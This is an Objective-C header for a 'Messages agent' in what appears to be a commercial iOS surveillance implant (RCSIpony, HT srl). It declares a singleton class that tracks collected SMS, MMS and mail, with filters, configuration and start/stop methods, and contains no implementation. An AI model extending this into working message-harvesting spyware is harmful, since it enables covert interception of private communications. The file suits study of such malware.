/*
 * RCSIpony - Messages agent
 *
 *
 * Created by Massimo Chiodini on 01/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSICommon.h"

#ifndef __RCSIAgentMessages_h__
#define __RCSIAgentMessages_h__

#import "RCSILogManager.h"


#define ALL_MSG ((long)0)

@interface RCSIAgentMessages : NSObject <Agents>
{
@public
  int  mSMS;
  int  mMMS;
  int  mMail;
  
@private
  NSMutableDictionary *mAgentConfiguration;
  NSMutableArray      *mMessageFilters;
  long                mLastRealTimeSMS;
  long                mLastCollectorSMS;
  long                mFirstCollectorSMS;
  long                mLastRealTimeMail;
  long                mLastCollectorMail;
  long                mFirstCollectorMail;
  long                mLastMMS;
}

@property (retain, readwrite) NSMutableDictionary    *mAgentConfiguration;

+ (RCSIAgentMessages *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (id)init;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;
- (BOOL)stop;
- (void)start;
@end                                        

#endif